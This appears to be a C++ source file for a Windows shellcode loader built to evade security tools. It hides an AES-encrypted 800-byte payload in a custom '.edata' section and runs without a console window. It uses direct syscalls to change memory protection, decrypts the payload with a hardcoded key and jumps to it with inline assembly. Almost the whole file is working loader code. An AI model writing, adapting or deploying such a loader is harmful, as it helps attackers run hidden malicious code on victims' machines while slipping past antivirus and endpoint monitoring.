#include <Windows.h>
#include <stdio.h>
#include "syscalls.h" // Import the generated header.
extern "C" {
#include "WjCryptLib_Aes.h"
}


#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"") //windows
//#pragma section(".edata",read,nopage)

#define SHELLCODESIZE 800
#define SIZEITEM 0x10


#pragma data_seg(".edata") 
char shellcode[SHELLCODESIZE] = {
    0xC2, 0xFA, 0xD3, 0xA5, 0x5E, 0x0D, 0x8A, 0xE8, 0x8F, 0xF3, 0xB9, 0x8D, 0x84, 0x7C, 0x81, 0x8D,
    0xDE, 0x1C, 0x91, 0xF3, 0xD9, 0x0B, 0xFF, 0xA5, 0xB0, 0xD1, 0x87, 0xAE, 0xE0, 0xC7, 0x78, 0xFB,
    0xE0, 0x00, 0x1A, 0xC6, 0xFB, 0x0B, 0x9C, 0x88, 0xAF, 0x2B, 0x76, 0xC1, 0xEF, 0x68, 0x15, 0xE1,
    0xA1, 0x70, 0xF4, 0x1F, 0x75, 0x2E, 0xA3, 0x52, 0xB3, 0xC7, 0x19, 0xA5, 0xCE, 0x77, 0xA3, 0x3E,
    0x9F, 0x50, 0x4D, 0xAD, 0x62, 0x84, 0x28, 0xB5, 0xD9, 0x20, 0x9E, 0xBA, 0x2F, 0x4F, 0xF2, 0xD1,
    0x03, 0x98, 0x38, 0x9E, 0x64, 0x96, 0x4C, 0x1B, 0xE5, 0xA1, 0xF9, 0xA5, 0x8E, 0x7D, 0xC7, 0x2D,
    0x06, 0x5B, 0xCD, 0x8C, 0x05, 0x21, 0x88, 0xAA, 0x81, 0x48, 0x64, 0xC6, 0xBE, 0x59, 0x1E, 0x00,
    0x68, 0x1A, 0x0F, 0xDB, 0xAC, 0xD6, 0x4E, 0x8D, 0x84, 0x99, 0x62, 0x68, 0x2F, 0x14, 0x0E, 0x7D,
    0x2C, 0x7E, 0x02, 0xE8, 0x71, 0x05, 0xA6, 0x47, 0x0C, 0xE2, 0xC4, 0x94, 0x7A, 0x0F, 0x05, 0xE3,
    0x78, 0x9C, 0xC0, 0x0C, 0x8E, 0x87, 0x5F, 0x58, 0x34, 0xF7, 0xEA, 0x24, 0x51, 0x4A, 0xD7, 0xE2,
    0x0A, 0x24, 0x61, 0x28, 0x06, 0xE2, 0x5B, 0x0B, 0xCD, 0xF2, 0xA1, 0x2E, 0x44, 0xFE, 0xEC, 0xDF,
    0x84, 0x9D, 0x9C, 0xF7, 0xCF, 0x27, 0x0A, 0xB1, 0x50, 0x2B, 0x19, 0xB9, 0x74, 0xC8, 0x1D, 0x53,
    0xAD, 0x7C, 0x3B, 0x8A, 0x36, 0x3D, 0xC8, 0xEE, 0xCD, 0xF1, 0x24, 0xB7, 0x2A, 0x3F, 0x5C, 0xBB,
    0xE1, 0x0D, 0x0F, 0x37, 0x6F, 0x1C, 0xC9, 0x17, 0x30, 0x2F, 0x44, 0x4A, 0xD4, 0xD8, 0x6C, 0x8E,
    0xC4, 0xBC, 0x5E, 0x31, 0x7F, 0x2A, 0xC8, 0xAF, 0x92, 0x8F, 0xC4, 0x4D, 0x52, 0xB2, 0x7E, 0x6E,
    0x13, 0x5A, 0x77, 0xC1, 0xDF, 0x59, 0x92, 0x36, 0x9B, 0xFC, 0x70, 0xDA, 0xD4, 0x99, 0xE4, 0x33,
    0x48, 0x97, 0xB1, 0xCE, 0x10, 0x33, 0x1E, 0x40, 0xBF, 0x5E, 0x9B, 0x44, 0x1F, 0xB3, 0x0E, 0xCE,
    0x72, 0xAA, 0x09, 0x19, 0x63, 0xB3, 0x90, 0xC7, 0x4C, 0xCE, 0x36, 0x6A, 0xA9, 0x83, 0xBB, 0x48,
    0x6C, 0x79, 0xC8, 0x66, 0x0C, 0xFA, 0x95, 0xF5, 0x0E, 0x92, 0xDC, 0x3C, 0x0B, 0x1A, 0x33, 0xB1,
    0x79, 0x0C, 0x0E, 0x86, 0x4A, 0xC4, 0xC6, 0x70, 0xD4, 0xF4, 0x01, 0xBB, 0x5F, 0xC6, 0x1C, 0xDA,
    0x70, 0x79, 0xFE, 0xC5, 0x6E, 0xD4, 0xDE, 0x7E, 0xF3, 0xB4, 0x48, 0x13, 0x97, 0xE2, 0xA1, 0x6B,
    0xA0, 0x24, 0xC6, 0x29, 0x86, 0xB3, 0xB1, 0xAF, 0x39, 0x6E, 0xD1, 0x54, 0x08, 0x8A, 0xA7, 0x92,
    0x29, 0xEB, 0xA3, 0xE0, 0xD2, 0xCA, 0xFB, 0xEC, 0xA7, 0x0F, 0x73, 0xBC, 0xFB, 0x73, 0xDE, 0x80,
    0x27, 0xBD, 0x0E, 0x41, 0x28, 0x09, 0x1C, 0xEC, 0xEC, 0xDC, 0xF8, 0xA6, 0x54, 0x3A, 0xEC, 0x31,
    0xDF, 0x8E, 0xF2, 0x7F, 0x86, 0x63, 0xFD, 0x35, 0xBC, 0xBB, 0x47, 0xF9, 0x8B, 0x6E, 0x4E, 0xF2,
    0x2E, 0x2F, 0x5A, 0xF9, 0x02, 0x0E, 0x46, 0x9A, 0xBE, 0xED, 0x4C, 0xF8, 0x86, 0xFF, 0x5B, 0xA1,
    0x3C, 0x6A, 0x65, 0x73, 0x40, 0xCE, 0xA6, 0x18, 0xAA, 0xC9, 0xDC, 0x0A, 0x74, 0xE1, 0x83, 0x2F,
    0xC0, 0x98, 0x6A, 0x4D, 0x54, 0x92, 0x0A, 0xC9, 0x6B, 0x5E, 0xE2, 0x59, 0x8F, 0xA4, 0x29, 0xF9,
    0xD3, 0xB3, 0x76, 0x06, 0xE8, 0x40, 0x8C, 0xCA, 0x1F, 0xD7, 0xE3, 0x1C, 0x23, 0xE7, 0xBE, 0x5A,
    0xAF, 0x4C, 0x48, 0xF3, 0x90, 0xFE, 0x6E, 0x4C, 0x34, 0x75, 0x71, 0x22, 0x43, 0xA7, 0x33, 0x1D,
    0x95, 0x10, 0xCD, 0x3A, 0x26, 0xF2, 0x15, 0x86, 0xB0, 0x3C, 0x5D, 0xA4, 0xF8, 0x31, 0x26, 0x79,
    0x72, 0x66, 0xC5, 0xC8, 0x47, 0xDB, 0xDD, 0xA9, 0xA6, 0x9E, 0x56, 0xF9, 0xD3, 0xB2, 0x16, 0x60,
    0x54, 0xDE, 0x97, 0xF9, 0x9D, 0x39, 0x34, 0x2C, 0x85, 0x5F, 0x53, 0x5E, 0x2F, 0xC4, 0x14, 0xC9,
    0xC7, 0x54, 0x55, 0xD6, 0xFD, 0x2D, 0xBC, 0x99, 0xA8, 0x3D, 0xA0, 0x09, 0x81, 0x1D, 0xD1, 0x51,
    0x88, 0xFE, 0x06, 0x98, 0x49, 0x04, 0x5F, 0x5C, 0xF0, 0x2D, 0xEE, 0xF7, 0xFB, 0x1E, 0x93, 0x03,
    0xE4, 0x7B, 0x99, 0xE5, 0x87, 0x3F, 0xB6, 0xDA, 0x05, 0xC5, 0x09, 0xCD, 0x4B, 0xD2, 0x41, 0x48,
    0xB3, 0x57, 0xD5, 0xD4, 0x6C, 0xD0, 0xE5, 0xE5, 0x2C, 0xF3, 0xB1, 0xF1, 0x26, 0x98, 0xE4, 0x88,
    0x54, 0xBB, 0xD8, 0xA0, 0xC1, 0x26, 0x8E, 0xA7, 0xA4, 0x6E, 0x26, 0xBF, 0x93, 0x16, 0x4A, 0x5A,
    0x12, 0xD3, 0xC2, 0x26, 0xC7, 0xD7, 0xF3, 0xAA, 0x12, 0xB4, 0x01, 0x94, 0x94, 0x2F, 0x4B, 0x9F,
    0x19, 0x10, 0x6A, 0x19, 0xAE, 0x14, 0xBB, 0xD4, 0xA2, 0xF4, 0x08, 0x62, 0xDC, 0xF9, 0xF6, 0x0B,
    0x75, 0x06, 0x7B, 0xFC, 0x25, 0x8E, 0xDD, 0x61, 0x9A, 0x8A, 0xFE, 0x35, 0xE7, 0x1C, 0xA2, 0xB6,
    0x52, 0x5F, 0x30, 0xED, 0x1C, 0xD1, 0x03, 0x7F, 0xE6, 0xD9, 0xA2, 0xE4, 0x1B, 0x44, 0x7F, 0xC8,
    0xE4, 0xCF, 0xB4, 0xF0, 0xBD, 0x75, 0x81, 0x55, 0x44, 0x0A, 0x1B, 0x44, 0x8A, 0x38, 0x5F, 0x02,
    0xD1, 0x57, 0x7E, 0x6E, 0xE0, 0x36, 0x1E, 0x94, 0xDD, 0xD4, 0xC1, 0xE0, 0x69, 0xB9, 0xC6, 0xF7,
    0x52, 0x4F, 0x34, 0xE4, 0x54, 0x0B, 0x54, 0xD3, 0x4E, 0xF1, 0xCA, 0xC6, 0x74, 0x15, 0xB5, 0xA6,
    0xBB, 0x34, 0x7C, 0xA9, 0x3D, 0xCB, 0xDC, 0x3F, 0xE8, 0x6F, 0x6F, 0x98, 0x38, 0x69, 0x80, 0x35,
    0x6E, 0xA3, 0x21, 0xCB, 0x92, 0x6C, 0x89, 0xE7, 0x52, 0x4D, 0x53, 0x90, 0xBF, 0x70, 0x83, 0x52,
    0x6A, 0x57, 0xF9, 0x8E, 0x19, 0xE0, 0xD6, 0x8C, 0x40, 0x32, 0xA2, 0x30, 0xC8, 0x5F, 0xA0, 0x3D,
    0x87, 0xF4, 0xE7, 0x75, 0xE2, 0x6B, 0x05, 0x25, 0x81, 0xEA, 0x51, 0x02, 0x20, 0x0B, 0xE5, 0x44,
    0xE3, 0x4C, 0x80, 0x6B, 0x70, 0xCB, 0x15, 0x97, 0xC4, 0x0D, 0x95, 0xAC, 0xBC, 0x3B, 0x37, 0x9C
};
#pragma data_seg() 
#pragma   comment(linker,"/SECTION:.edata,R") 

//msgµÄshellcode
//__declspec(allocate(".edata")) char shellcode[SHELLCODESIZE] = {
//    0xC2, 0xFA, 0xD3, 0xA5, 0x5E, 0x0D, 0x8A, 0xE8, 0x8F, 0xF3, 0xB9, 0x8D, 0x84, 0x7C, 0x81, 0x8D,
//    0xDE, 0x1C, 0x91, 0xF3, 0xD9, 0x0B, 0xFF, 0xA5, 0xB0, 0xD1, 0x87, 0xAE, 0xE0, 0xC7, 0x78, 0xFB,
//    0xE0, 0x00, 0x1A, 0xC6, 0xFB, 0x0B, 0x9C, 0x88, 0xAF, 0x2B, 0x76, 0xC1, 0xEF, 0x68, 0x15, 0xE1,
//    0xA1, 0x70, 0xF4, 0x1F, 0x75, 0x2E, 0xA3, 0x52, 0xB3, 0xC7, 0x19, 0xA5, 0xCE, 0x77, 0xA3, 0x3E,
//    0x9F, 0x50, 0x4D, 0xAD, 0x62, 0x84, 0x28, 0xB5, 0xD9, 0x20, 0x9E, 0xBA, 0x2F, 0x4F, 0xF2, 0xD1,
//    0x03, 0x98, 0x38, 0x9E, 0x64, 0x96, 0x4C, 0x1B, 0xE5, 0xA1, 0xF9, 0xA5, 0x8E, 0x7D, 0xC7, 0x2D,
//    0x06, 0x5B, 0xCD, 0x8C, 0x05, 0x21, 0x88, 0xAA, 0x81, 0x48, 0x64, 0xC6, 0xBE, 0x59, 0x1E, 0x00,
//    0x68, 0x1A, 0x0F, 0xDB, 0xAC, 0xD6, 0x4E, 0x8D, 0x84, 0x99, 0x62, 0x68, 0x2F, 0x14, 0x0E, 0x7D,
//    0x2C, 0x7E, 0x02, 0xE8, 0x71, 0x05, 0xA6, 0x47, 0x0C, 0xE2, 0xC4, 0x94, 0x7A, 0x0F, 0x05, 0xE3,
//    0x78, 0x9C, 0xC0, 0x0C, 0x8E, 0x87, 0x5F, 0x58, 0x34, 0xF7, 0xEA, 0x24, 0x51, 0x4A, 0xD7, 0xE2,
//    0x0A, 0x24, 0x61, 0x28, 0x06, 0xE2, 0x5B, 0x0B, 0xCD, 0xF2, 0xA1, 0x2E, 0x44, 0xFE, 0xEC, 0xDF,
//    0x84, 0x9D, 0x9C, 0xF7, 0xCF, 0x27, 0x0A, 0xB1, 0x50, 0x2B, 0x19, 0xB9, 0x74, 0xC8, 0x1D, 0x53,
//    0xAD, 0x7C, 0x3B, 0x8A, 0x36, 0x3D, 0xC8, 0xEE, 0xCD, 0xF1, 0x24, 0xB7, 0x2A, 0x3F, 0x5C, 0xBB,
//    0xE1, 0x0D, 0x0F, 0x37, 0x6F, 0x1C, 0xC9, 0x17, 0x30, 0x2F, 0x44, 0x4A, 0xD4, 0xD8, 0x6C, 0x8E,
//    0xC4, 0xBC, 0x5E, 0x31, 0x7F, 0x2A, 0xC8, 0xAF, 0x92, 0x8F, 0xC4, 0x4D, 0x52, 0xB2, 0x7E, 0x6E,
//    0x13, 0x5A, 0x77, 0xC1, 0xDF, 0x59, 0x92, 0x36, 0x9B, 0xFC, 0x70, 0xDA, 0xD4, 0x99, 0xE4, 0x33,
//    0x48, 0x97, 0xB1, 0xCE, 0x10, 0x33, 0x1E, 0x40, 0xBF, 0x5E, 0x9B, 0x44, 0x1F, 0xB3, 0x0E, 0xCE,
//    0x72, 0xAA, 0x09, 0x19, 0x63, 0xB3, 0x90, 0xC7, 0x4C, 0xCE, 0x36, 0x6A, 0xA9, 0x83, 0xBB, 0x48,
//    0x6C, 0x79, 0xC8, 0x66, 0x0C, 0xFA, 0x95, 0xF5, 0x0E, 0x92, 0xDC, 0x3C, 0x0B, 0x1A, 0x33, 0xB1,
//    0x79, 0x0C, 0x0E, 0x86, 0x4A, 0xC4, 0xC6, 0x70, 0xD4, 0xF4, 0x01, 0xBB, 0x5F, 0xC6, 0x1C, 0xDA,
//    0x70, 0x79, 0xFE, 0xC5, 0x6E, 0xD4, 0xDE, 0x7E, 0xF3, 0xB4, 0x48, 0x13, 0x97, 0xE2, 0xA1, 0x6B,
//    0xA0, 0x24, 0xC6, 0x29, 0x86, 0xB3, 0xB1, 0xAF, 0x39, 0x6E, 0xD1, 0x54, 0x08, 0x8A, 0xA7, 0x92,
//    0x29, 0xEB, 0xA3, 0xE0, 0xD2, 0xCA, 0xFB, 0xEC, 0xA7, 0x0F, 0x73, 0xBC, 0xFB, 0x73, 0xDE, 0x80,
//    0x27, 0xBD, 0x0E, 0x41, 0x28, 0x09, 0x1C, 0xEC, 0xEC, 0xDC, 0xF8, 0xA6, 0x54, 0x3A, 0xEC, 0x31,
//    0xDF, 0x8E, 0xF2, 0x7F, 0x86, 0x63, 0xFD, 0x35, 0xBC, 0xBB, 0x47, 0xF9, 0x8B, 0x6E, 0x4E, 0xF2,
//    0x2E, 0x2F, 0x5A, 0xF9, 0x02, 0x0E, 0x46, 0x9A, 0xBE, 0xED, 0x4C, 0xF8, 0x86, 0xFF, 0x5B, 0xA1,
//    0x3C, 0x6A, 0x65, 0x73, 0x40, 0xCE, 0xA6, 0x18, 0xAA, 0xC9, 0xDC, 0x0A, 0x74, 0xE1, 0x83, 0x2F,
//    0xC0, 0x98, 0x6A, 0x4D, 0x54, 0x92, 0x0A, 0xC9, 0x6B, 0x5E, 0xE2, 0x59, 0x8F, 0xA4, 0x29, 0xF9,
//    0xD3, 0xB3, 0x76, 0x06, 0xE8, 0x40, 0x8C, 0xCA, 0x1F, 0xD7, 0xE3, 0x1C, 0x23, 0xE7, 0xBE, 0x5A,
//    0xAF, 0x4C, 0x48, 0xF3, 0x90, 0xFE, 0x6E, 0x4C, 0x34, 0x75, 0x71, 0x22, 0x43, 0xA7, 0x33, 0x1D,
//    0x95, 0x10, 0xCD, 0x3A, 0x26, 0xF2, 0x15, 0x86, 0xB0, 0x3C, 0x5D, 0xA4, 0xF8, 0x31, 0x26, 0x79,
//    0x72, 0x66, 0xC5, 0xC8, 0x47, 0xDB, 0xDD, 0xA9, 0xA6, 0x9E, 0x56, 0xF9, 0xD3, 0xB2, 0x16, 0x60,
//    0x54, 0xDE, 0x97, 0xF9, 0x9D, 0x39, 0x34, 0x2C, 0x85, 0x5F, 0x53, 0x5E, 0x2F, 0xC4, 0x14, 0xC9,
//    0xC7, 0x54, 0x55, 0xD6, 0xFD, 0x2D, 0xBC, 0x99, 0xA8, 0x3D, 0xA0, 0x09, 0x81, 0x1D, 0xD1, 0x51,
//    0x88, 0xFE, 0x06, 0x98, 0x49, 0x04, 0x5F, 0x5C, 0xF0, 0x2D, 0xEE, 0xF7, 0xFB, 0x1E, 0x93, 0x03,
//    0xE4, 0x7B, 0x99, 0xE5, 0x87, 0x3F, 0xB6, 0xDA, 0x05, 0xC5, 0x09, 0xCD, 0x4B, 0xD2, 0x41, 0x48,
//    0xB3, 0x57, 0xD5, 0xD4, 0x6C, 0xD0, 0xE5, 0xE5, 0x2C, 0xF3, 0xB1, 0xF1, 0x26, 0x98, 0xE4, 0x88,
//    0x54, 0xBB, 0xD8, 0xA0, 0xC1, 0x26, 0x8E, 0xA7, 0xA4, 0x6E, 0x26, 0xBF, 0x93, 0x16, 0x4A, 0x5A,
//    0x12, 0xD3, 0xC2, 0x26, 0xC7, 0xD7, 0xF3, 0xAA, 0x12, 0xB4, 0x01, 0x94, 0x94, 0x2F, 0x4B, 0x9F,
//    0x19, 0x10, 0x6A, 0x19, 0xAE, 0x14, 0xBB, 0xD4, 0xA2, 0xF4, 0x08, 0x62, 0xDC, 0xF9, 0xF6, 0x0B,
//    0x75, 0x06, 0x7B, 0xFC, 0x25, 0x8E, 0xDD, 0x61, 0x9A, 0x8A, 0xFE, 0x35, 0xE7, 0x1C, 0xA2, 0xB6,
//    0x52, 0x5F, 0x30, 0xED, 0x1C, 0xD1, 0x03, 0x7F, 0xE6, 0xD9, 0xA2, 0xE4, 0x1B, 0x44, 0x7F, 0xC8,
//    0xE4, 0xCF, 0xB4, 0xF0, 0xBD, 0x75, 0x81, 0x55, 0x44, 0x0A, 0x1B, 0x44, 0x8A, 0x38, 0x5F, 0x02,
//    0xD1, 0x57, 0x7E, 0x6E, 0xE0, 0x36, 0x1E, 0x94, 0xDD, 0xD4, 0xC1, 0xE0, 0x69, 0xB9, 0xC6, 0xF7,
//    0x52, 0x4F, 0x34, 0xE4, 0x54, 0x0B, 0x54, 0xD3, 0x4E, 0xF1, 0xCA, 0xC6, 0x74, 0x15, 0xB5, 0xA6,
//    0xBB, 0x34, 0x7C, 0xA9, 0x3D, 0xCB, 0xDC, 0x3F, 0xE8, 0x6F, 0x6F, 0x98, 0x38, 0x69, 0x80, 0x35,
//    0x6E, 0xA3, 0x21, 0xCB, 0x92, 0x6C, 0x89, 0xE7, 0x52, 0x4D, 0x53, 0x90, 0xBF, 0x70, 0x83, 0x52,
//    0x6A, 0x57, 0xF9, 0x8E, 0x19, 0xE0, 0xD6, 0x8C, 0x40, 0x32, 0xA2, 0x30, 0xC8, 0x5F, 0xA0, 0x3D,
//    0x87, 0xF4, 0xE7, 0x75, 0xE2, 0x6B, 0x05, 0x25, 0x81, 0xEA, 0x51, 0x02, 0x20, 0x0B, 0xE5, 0x44,
//    0xE3, 0x4C, 0x80, 0x6B, 0x70, 0xCB, 0x15, 0x97, 0xC4, 0x0D, 0x95, 0xAC, 0xBC, 0x3B, 0x37, 0x9C
//};

uint8_t Key128[16] = { 0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c };

IMAGE_DOS_HEADER* GetDosHeader(void* pFileData)
{
    return (IMAGE_DOS_HEADER*)pFileData;
}

IMAGE_NT_HEADERS* GetNtHeader(void* pFileData)
{
    return (IMAGE_NT_HEADERS*)(GetDosHeader(pFileData)->e_lfanew + (SIZE_T)pFileData);
}

IMAGE_FILE_HEADER* GetFileHead(void* pFileData)
{
    return &GetNtHeader(pFileData)->FileHeader;
}

IMAGE_OPTIONAL_HEADER* GetOptionHeader(void* pFileData)
{
    return &GetNtHeader(pFileData)->OptionalHeader;
}


int main(int argc,char* argv) {

	/*

	HANDLE hEvent = NULL;

	NTSTATUS stat = NtCreateEvent(&hEvent, EVENT_ALL_ACCESS,0, NotificationEvent,0);

	printf("%d", stat);

	return 0;*/


    HMODULE hCurProcess = NULL;
    hCurProcess = GetModuleHandle(NULL);
    if (hCurProcess == NULL)
    {
        return -1;
    }

    //Çø¶ÎÊý
    DWORD dwSectionCount = GetFileHead(hCurProcess)->NumberOfSections;
    //»ñÈ¡µÚÒ»¸öÇø¶Î
    IMAGE_SECTION_HEADER* pFirstSection = IMAGE_FIRST_SECTION(GetNtHeader(hCurProcess));
    DWORD dwShellCodeSize = 0;
    DWORD dwShellCodeAddress = NULL;
    //ÏÈ°ÑvaºÍsize±£´æ£¬ÔÚsyscallÉèÖÃÊôÐÔ£¬ÔÙ½âÂë£¬ÔÙÉèÖÃÊôÐÔ£¬ÔÙÌø×ªÖ´ÐÐ
    for (DWORD i = 0; i < dwSectionCount; i++)
    {
        DWORD dwIsShellCode = lstrcmp((LPCSTR)pFirstSection[i].Name, (LPCSTR)".edata");
        if (dwIsShellCode == 0)
        {
            DWORD dwShellCodeVirtualAddress = pFirstSection[i].VirtualAddress;
            dwShellCodeSize = pFirstSection[i].SizeOfRawData;
            dwShellCodeAddress = dwShellCodeVirtualAddress + (DWORD)hCurProcess;
            //printf("%x", pFirstSection[i].VirtualAddress + hCurProcess);
            break;
        }
    }

    DWORD dwOldProtect;
    NTSTATUS stat;
    stat = NtProtectVirtualMemory((HANDLE)0xFFFFFFFF,(PVOID*)&dwShellCodeAddress, &dwShellCodeSize, PAGE_READWRITE, &dwOldProtect);

    AesContext mAesContext;
    AesInitialise(&mAesContext, Key128, AES_KEY_SIZE_128);
    DWORD dwSum = 0;
    DWORD i = 0;
    while (SHELLCODESIZE > dwSum)
    {
        AesDecrypt(&mAesContext, (uint8_t*)shellcode + i * SIZEITEM, (uint8_t*)shellcode + i * SIZEITEM);
        dwSum += 0x10;
        i++;
    }

    stat = NtProtectVirtualMemory((HANDLE)0xFFFFFFFF, (PVOID*)&dwShellCodeAddress, &dwShellCodeSize, PAGE_EXECUTE_READ, &dwOldProtect);


    __asm {
        call dwShellCodeAddress;
    }
    _flushall();

    return 0;
}